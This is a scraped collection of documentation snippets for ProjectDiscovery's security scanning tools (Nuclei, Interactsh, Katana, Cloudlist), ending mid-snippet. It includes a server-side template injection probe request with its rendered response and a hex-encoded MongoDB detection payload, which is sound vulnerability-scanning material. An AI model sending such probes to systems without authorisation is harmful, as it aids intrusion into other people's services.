https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.SessionSetupLog.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface SessionSetupLog {\n    HeaderLog?: HeaderLog;\n    NegotiateFlags?: number;\n    SetupFlags?: number;\n    TargetName?: string;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom SSL Certificate in Interactsh\nDESCRIPTION: Command to start Interactsh server with custom SSL certificate and private key files.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_10\n\nLANGUAGE: console\nCODE:\n```\ninteractsh-server -d hackwithautomation.com -cert hackwithautomation.com.crt -privkey hackwithautomation.com.key\n```\n\n----------------------------------------\n\nTITLE: Using Buffer.WriteString() Method in JavaScript\nDESCRIPTION: Demonstrates how to use the WriteString() method to append string data to the buffer.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/bytes.Buffer.mdx#2025-04-12_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nconst bytes = require('nuclei/bytes');\nconst buffer = new bytes.Buffer();\nbuffer.WriteString('hello');\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Team Member Management Endpoint\nDESCRIPTION: YAML specification for the POST /v1/user/team/member endpoint. This defines the API structure for team member management operations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/add-team-member.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/user/team/member\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Path Definition for Scan Config Updates\nDESCRIPTION: Defines the API path specification for updating scan configurations using the PATCH HTTP method. The endpoint accepts a scan ID parameter in the path.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/update-scan-config.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /v1/scans/{scan_id}/config\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Server-side Template Injection (SSTI) Vulnerability in HTTP\nDESCRIPTION: This snippet illustrates a Server-side Template Injection vulnerability in a custom greeting card function. The application processes the message parameter as a template, leading to potential code execution.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/editor/ai.mdx#2025-04-12_snippet_3\n\nLANGUAGE: http\nCODE:\n```\nPOST /create-card HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\n\nmessage={{7*7}}\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1337\nServer: Apache\n\n<html>\n...\n<p>Your card: 49</p>\n...\n</html>\n```\n\n----------------------------------------\n\nTITLE: Displaying Notify Help\nDESCRIPTION: Command to show all available help options for the Notify tool\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnotify -h\n```\n\n----------------------------------------\n\nTITLE: Configuring DNS Interaction Matcher\nDESCRIPTION: Shows how to implement a basic word matcher to confirm DNS protocol interactions with Interactsh server.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/oob-testing.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n    matchers:\n      - type: word\n        part: interactsh_protocol # Confirms the DNS Interaction\n        words:\n          - \"dns\"\n```\n\n----------------------------------------\n\nTITLE: Using IsVNC Function in JavaScript\nDESCRIPTION: This snippet demonstrates how to use the IsVNC function from the VNC module to check if a given host and port are running a VNC server. It imports the VNC module, calls the IsVNC function, and logs the result.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/vnc.IsVNCResponse.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst vnc = require('nuclei/vnc');\nconst isVNC = vnc.IsVNC('acme.com', 5900);\nlog(toJSON(isVNC));\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Delete Endpoint Definition for Scan Configuration Exclusions\nDESCRIPTION: OpenAPI specification for a delete operation on the /v1/scans/config/exclude endpoint. This endpoint is likely used to remove exclusion rules from scan configurations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/configurations/delete-excluded-template-ids.mdx#2025-04-12_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /v1/scans/config/exclude\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for GET /v1/scans/config\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the GET /v1/scans/config endpoint. It specifies the HTTP method, path, and likely includes details about request parameters and response structure in the full specification.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/configurations/get-configs-list.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/config\n```\n\n----------------------------------------\n\nTITLE: PDTM Binary Download URL\nDESCRIPTION: URL to download pre-compiled binary releases of PDTM. Users need to download the appropriate binary for their operating system and unzip it for use.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/pdtm/install.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nhttps://github.com/projectdiscovery/pdtm/releases\n```\n\n----------------------------------------\n\nTITLE: TypeScript Interface Properties Definition\nDESCRIPTION: TypeScript interface definition showing the optional properties Auth (boolean) and PluginInfo (ServiceRDP type) that make up the CheckRDPAuthResponse interface.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/rdp.CheckRDPAuthResponse.mdx#2025-04-12_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\ninterface CheckRDPAuthResponse {\n    Auth?: boolean;       // Defined in rdp.ts:52\n    PluginInfo?: ServiceRDP;  // Defined in rdp.ts:50\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading OpenAPI Specification for ProjectDiscovery Documentation\nDESCRIPTION: This command runs a shell script that downloads the latest OpenAPI specification (openapi.yaml) for the PDCP API. This file is used to generate API reference documentation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/Home.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n./bin/download-api.sh\n```\n\n----------------------------------------\n\nTITLE: Running httpx with UI Dashboard Integration in Console\nDESCRIPTION: This snippet demonstrates how to run httpx and upload the results to the ProjectDiscovery Cloud Platform (PDCP) UI Dashboard. It uses the chaos tool to generate subdomains and pipes them into httpx.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_11\n\nLANGUAGE: console\nCODE:\n```\n$ chaos -d hackerone.com | httpx -dashboard\n```\n\n----------------------------------------\n\nTITLE: Extending CSSType Definitions with Type Assertion in Flow\nDESCRIPTION: Example of using Flow type assertion to extend CSSType definitions. It shows how to add missing properties and CSS custom properties.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_11\n\nLANGUAGE: javascript\nCODE:\n```\nconst style: $Exact<CSS.Properties<*>> = {\n  // Add a missing property\n  [('WebkitRocketLauncher': any)]: 'launching',\n\n  // Add a CSS Custom Property\n  [('--theme-color': any)]: 'black',\n};\n```\n\n----------------------------------------\n\nTITLE: Customizing Payload Length in Interactsh Server\nDESCRIPTION: Example of starting Interactsh server with custom correlation ID length and nonce token using cidl and cidn flags.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_8\n\nLANGUAGE: console\nCODE:\n```\ninteractsh-server -d hackwithautomation.com -cidl 4 -cidn 6\n```\n\n----------------------------------------\n\nTITLE: Using Buffer.Hexdump() Method in JavaScript\nDESCRIPTION: Shows how to use the Hexdump() method to get a formatted hexdump representation of the buffer contents as a string.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/bytes.Buffer.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst bytes = require('nuclei/bytes');\nconst buffer = new bytes.Buffer();\nbuffer.WriteString('hello');\nlog(buffer.Hexdump());\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Delete Scan Endpoint in YAML\nDESCRIPTION: This YAML snippet specifies the OpenAPI endpoint for deleting a scan using its unique identifier. It defines the HTTP method, path parameters, and expected response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/delete-scan.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/scans/{scan_id}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Team Member Endpoint\nDESCRIPTION: YAML OpenAPI specification defining the GET endpoint for retrieving team member information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/get-team-members.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/user/team/member\n```\n\n----------------------------------------\n\nTITLE: Running interactsh-client Docker Image\nDESCRIPTION: This snippet demonstrates how to run the interactsh-client using its Docker image, which provides a ready-to-use environment for the tool.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/running.mdx#2025-04-12_snippet_6\n\nLANGUAGE: sh\nCODE:\n```\ndocker run projectdiscovery/interactsh-client:latest\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Automatic Form Fill\nDESCRIPTION: Example command showing how to enable automatic form filling feature in Katana crawler\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_19\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -aff\n```\n\n----------------------------------------\n\nTITLE: Adding Go bin to PATH on Unix-like Systems\nDESCRIPTION: These commands add the Go bin path to the system PATH on OSX or Linux. This ensures that the installed Cloudlist binary can be executed from any location in the terminal.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/install.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\necho export $PATH=$PATH:$HOME/go/bin >> $home/.bashrc\nsource $home/.bashrc\n```\n\n----------------------------------------\n\nTITLE: Setting Subject in JavaScript\nDESCRIPTION: Adds the subject field to the SMTPMessage object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPMessage.mdx#2025-04-12_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.Subject('hello');\n```\n\n----------------------------------------\n\nTITLE: OpenAPI DELETE Endpoint Specification for Asset Deletion\nDESCRIPTION: YAML specification for a REST endpoint that handles asset deletion via the /v1/asset/{asset_id} path using the DELETE HTTP method.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/assets/delete-enumerated-asset.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/asset/{asset_id}\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Integration Retrieval in YAML\nDESCRIPTION: This YAML snippet defines an OpenAPI endpoint for retrieving all integrations by name. It specifies the HTTP method (GET) and the path '/v1/integration/{name}/all', where {name} is a path parameter.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/get-all-integrations.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/integration/{name}/all\n```\n\n----------------------------------------\n\nTITLE: Configuring DigitalOcean Provider for Cloudlist\nDESCRIPTION: YAML configuration block for integrating DigitalOcean with Cloudlist. Requires an API token with read access.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: do # provider is the name of the provider\n  # id is the name defined by user for filtering (optional)\n  id: xxxx\n  # digitalocean_token is the API key for digitalocean cloud platform\n  digitalocean_token: $DIGITALOCEAN_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Setting 'To' Field in JavaScript\nDESCRIPTION: Adds the 'To' field to the SMTPMessage object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPMessage.mdx#2025-04-12_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.To('xyz@projectdiscovery.io');\n```\n\n----------------------------------------\n\nTITLE: Defining DirectionAlgorithms Interface in TypeScript\nDESCRIPTION: This snippet defines the DirectionAlgorithms interface with optional properties for Cipher, Compression, and MAC. Each property is of type string and is defined in the ssh.ts file.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.DirectionAlgorithms.mdx#2025-04-12_snippet_0\n\nLANGUAGE: TypeScript\nCODE:\n```\ninterface DirectionAlgorithms {\n  MAC?: string;\n  Compression?: string;\n  Cipher?: string;\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing LDAP Client - Advanced Configuration\nDESCRIPTION: Creates a new LDAP client instance with advanced configuration options including timeout and server name settings.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst cfg = new ldap.Config();\ncfg.Timeout = 10;\ncfg.ServerName = 'ldap.internal.acme.com';\n// optional config can be passed as third argument\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com', cfg);\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for Scan Import Endpoint\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the endpoint to import scan results. It specifies the HTTP PATCH method, the path with a scan_id parameter, and outlines the expected request body structure.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/update-imported-scan.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /v1/scans/{scan_id}/import\n```\n\n----------------------------------------\n\nTITLE: Sending Array Data\nDESCRIPTION: Example of sending an array of data over the connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\nconn.SendArray(['hello', 'world']);\n```\n\n----------------------------------------\n\nTITLE: Receiving String Data\nDESCRIPTION: Shows how to receive data as a string from the network connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\nconst data = conn.RecvFullString(1024);\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Delete Vulnerability Scans Endpoint\nDESCRIPTION: OpenAPI specification for the DELETE /v1/scans/vulns endpoint used to remove vulnerability scan results.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/delete-scan-vulnerability.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/scans/vulns\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for GET /v1/assets Endpoint in YAML\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the GET /v1/assets endpoint. It likely includes details such as the endpoint path, HTTP method, request parameters, response schemas, and any authentication requirements.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/assets/get-asset-list.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/assets\n```\n\n----------------------------------------\n\nTITLE: Installing Katana using Docker\nDESCRIPTION: This command pulls the latest Docker image of ProjectDiscovery's Katana. It requires Docker to be installed on the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/install.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ndocker pull projectdiscovery/katana:latest\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Custom Crawl Depth\nDESCRIPTION: Shows how to set a custom crawl depth for Katana.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -d 5\n```\n\n----------------------------------------\n\nTITLE: Configuring Go bin Path in Unix Systems\nDESCRIPTION: Commands to add Go binary path to system PATH variable in OSX or Linux environments and reload the configuration.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cvemap/install.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\necho export $PATH=$PATH:$HOME/go/bin >> $home/.bashrc\nsource $home/.bashrc\n```\n\n----------------------------------------\n\nTITLE: Setting Message Body in JavaScript\nDESCRIPTION: Adds the message body to the SMTPMessage object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPMessage.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.Body('hello');\n```\n\n----------------------------------------\n\nTITLE: Defining POST Endpoint for Team Member Management in OpenAPI\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for a POST endpoint at /v1/admin/team/member. It specifies the HTTP method and route for managing team members in an API.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/add-team-member-admin.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/admin/team/member\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for GET Scan Result Endpoint\nDESCRIPTION: This OpenAPI specification defines the endpoint for retrieving scan results by scan ID. It provides details on the endpoint path, required parameters, and expected response formats.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/results/get-scan-results.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/result/{scanId}\n```\n\n----------------------------------------\n\nTITLE: Configuring Terraform Provider in YAML\nDESCRIPTION: Example configuration block for integrating Terraform with Cloudlist. Requires the path to the Terraform state file.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: terraform\n  id: staging\n  tf_state_file: path/to/terraform.tfstate\n```\n\n----------------------------------------\n\nTITLE: Outputting Chaos Results as JSON\nDESCRIPTION: Shows how to print the Chaos output in JSON format using the -json flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nchaos -d uber.com -json\n```\n\n----------------------------------------\n\nTITLE: Opening Bash Configuration File for PATH Update\nDESCRIPTION: Command to open the Bash shell configuration file to update the PATH environment variable to include Go binary directory.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/nuclei-setup.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nnano ~/.bashrc\n```\n\n----------------------------------------\n\nTITLE: Store Response CLI Usage\nDESCRIPTION: Example of using the -store-response flag to save crawled requests and responses to files\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_30\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://example.com -no-scope -store-response\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI POST Endpoint for Vulnerability Ticket Creation\nDESCRIPTION: This YAML snippet defines an OpenAPI endpoint for creating a ticket associated with a specific vulnerability. It specifies the HTTP method as POST and the path as /v1/scans/vulns/{vuln_id}/ticket, where {vuln_id} is a path parameter representing the vulnerability ID.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/create-vulns-export-to-tracker.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/scans/vulns/{vuln_id}/ticket\n```\n\n----------------------------------------\n\nTITLE: Configuring Linode Provider in YAML\nDESCRIPTION: Example configuration block for integrating Linode with Cloudlist. Requires a personal access token with 'Read Only' scope for Linodes resource.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: linode\n  id: staging\n  linode_personal_access_token: $LINODE_PERSONAL_ACCESS_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Setting 'From' Field in JavaScript\nDESCRIPTION: Adds the 'From' field to the SMTPMessage object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPMessage.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.From('xyz@projectdiscovery.io');\n```\n\n----------------------------------------\n\nTITLE: Defining EncryptionKey Interface in TypeScript\nDESCRIPTION: TypeScript interface definition for EncryptionKey used in Kerberos authentication. Contains two optional properties: KeyType as a number and KeyValue as a Uint8Array for storing the actual encryption key data.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.EncryptionKey.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface EncryptionKey {\n    KeyType?: number;\n    KeyValue?: Uint8Array;\n}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Scan Deletion Endpoint\nDESCRIPTION: YAML specification defining the OpenAPI path for the DELETE /v1/scans endpoint. This endpoint is used to delete scan resources from the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/delete-scan-in-bulk.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: delete /v1/scans\n```\n\n----------------------------------------\n\nTITLE: Defining SSH Algorithm Interface Properties in TypeScript\nDESCRIPTION: Interface definition for SSH algorithm configuration including optional properties for host key, key exchange (Kex), and directional algorithms for read (R) and write (W) operations. Each property is strongly typed and references external definitions where needed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.Algorithms.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface Algorithms {\n    HostKey?: string;\n    Kex?: string;\n    R?: DirectionAlgorithms;\n    W?: DirectionAlgorithms;\n}\n```\n\n----------------------------------------\n\nTITLE: Cloudlist CLI Options and Flags - YAML Configuration\nDESCRIPTION: Comprehensive listing of Cloudlist command-line options including configuration settings, filters for providers and services, update controls, and output formatting options. The configuration supports multiple cloud providers and various filtering capabilities for assets.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nCloudlist is a tool for listing Assets from multiple cloud providers.\n\nUsage:\n  ./cloudlist [flags]\n\nFlags:\nCONFIGURATION:\n   -config string                cloudlist flag config file (default \"$HOME/.config/cloudlist/config.yaml\")\n   -pc, -provider-config string  provider config file (default \"$HOME/.config/cloudlist/provider-config.yaml\")\n\nFILTERS:\n   -p, -provider value    display results for given providers (comma-separated) (default linode,fastly,heroku,terraform,digitalocean,consul,cloudflare,hetzner,nomad,do,scw,openstack,alibaba,aws,gcp,namecheap,kubernetes,azure)\n   -id string[]           display results for given ids (comma-separated)\n   -host                  display only hostnames in results\n   -ip                    display only ips in results\n   -s, -service value     query and display results from given service (comma-separated)) (default cloudfront,gke,domain,compute,ec2,instance,cloud-function,app,eks,consul,droplet,vm,ecs,fastly,alb,s3,lambda,elb,cloud-run,route53,publicip,dns,service,nomad,lightsail,ingress,apigateway)\n   -ep, -exclude-private  exclude private ips in cli output\n\nUPDATE:\n   -up, -update                 update cloudlist to latest version\n   -duc, -disable-update-check  disable automatic cloudlist update check\n\nOUTPUT:\n   -o, -output string  output file to write results\n   -json               write output in json format\n   -version            display version of cloudlist\n   -v                  display verbose output\n   -silent             display only results in output\n```\n\n----------------------------------------\n\nTITLE: Adding Go bin path to system paths\nDESCRIPTION: These commands add the Go bin path to system paths on OSX or Linux. This ensures that the Subfinder binary is accessible from anywhere in the terminal.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/install.mdx#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\necho export PATH=$PATH:$HOME/go/bin >> $home/.bashrc\nsource $home/.bashrc\n```\n\n----------------------------------------\n\nTITLE: MongoDB Detection with Input Expressions in YAML\nDESCRIPTION: Template showing DSL Helper Expression usage for MongoDB detection, using hex_decode function for complex input creation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network-examples.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nid: input-expressions-mongodb-detect\n\ninfo:\n  name: Input Expression MongoDB Detection\n  author: pd-team\n  severity: info\n  reference: https://github.com/orleven/Tentacle\n\ntcp:\n  - inputs:\n      - data: \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\"\n    host:\n      - \"{{Hostname}}\"\n    read-size: 2048\n    matchers:\n      - type: word\n        words:\n          - \"logicalSessionTimeout\"\n          - \"localTime\"\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Asset Enumeration Endpoint\nDESCRIPTION: Defines the API endpoint for retrieving asset enumeration data by its ID. The API path follows the RESTful convention for accessing a specific resource.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/get-enumeration.mdx#2025-04-12_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /v1/asset/enumerate/{enumerate_id}\n```\n\n----------------------------------------\n\nTITLE: EncTicketPart Interface Property Definitions in TypeScript\nDESCRIPTION: Defines the properties of the EncTicketPart interface which is part of the Kerberos authentication protocol implementation. The interface includes properties for timestamps, encryption keys, principal names, and other Kerberos-specific data structures.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.EncTicketPart.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **AuthTime**: `Date`\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **AuthorizationData**: [`AuthorizationDataEntry`](/templates/protocols/javascript/modules/kerberos.AuthorizationDataEntry)\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **CAddr**: [`HostAddress`](/templates/protocols/javascript/modules/kerberos.HostAddress)\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **CName**: [`PrincipalName`](/templates/protocols/javascript/modules/kerberos.PrincipalName)\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **CRealm**: `string`\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **EndTime**: `Date`\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **Flags**: [`BitString`](/templates/protocols/javascript/modules/kerberos.BitString)\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **Key**: [`EncryptionKey`](/templates/protocols/javascript/modules/kerberos.EncryptionKey)\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **RenewTill**: `Date`\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **StartTime**: `Date`\n```\n\nLANGUAGE: typescript\nCODE:\n```\n• `Optional` **Transited**: [`TransitedEncoding`](/templates/protocols/javascript/modules/kerberos.TransitedEncoding)\n```\n\n----------------------------------------\n\nTITLE: Binary Matcher in YAML\nDESCRIPTION: Shows how to match binary/hexadecimal patterns in responses for file type detection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nmatchers:\n  - type: binary\n    binary:\n      - \"504B0304\" # zip archive\n      - \"526172211A070100\" # RAR archive version 5.0\n      - \"FD377A585A0000\" # xz tar.xz archive\n    condition: or\n    part: body\n```\n\n----------------------------------------\n\nTITLE: Displaying Interactsh Server Help\nDESCRIPTION: Command to show all available options and flags for the interactsh-server\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ninteractsh-server -h\n```\n\n----------------------------------------\n\nTITLE: Unpacking Binary Data with Structs Module\nDESCRIPTION: Example of unpacking binary data from a byte array using a format string. Takes a format string and Uint8Array as input and returns the unpacked values as an array or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/structs.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst structs = require('nuclei/structs');\nconst result = structs.Unpack('H', [0]);\n```\n\n----------------------------------------\n\nTITLE: Defining PATCH Endpoint for Asset Update in OpenAPI\nDESCRIPTION: OpenAPI specification snippet defining the PATCH endpoint for updating an asset by its ID. This endpoint allows partial updates to an existing asset resource.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/assets/update-asset-details.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /v1/asset/{asset_id}\n```\n\n----------------------------------------\n\nTITLE: Configuring Scaleway Provider for Cloudlist\nDESCRIPTION: YAML configuration block for integrating Scaleway with Cloudlist. Requires access key and token.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: scw # provider is the name of the provider\n  # 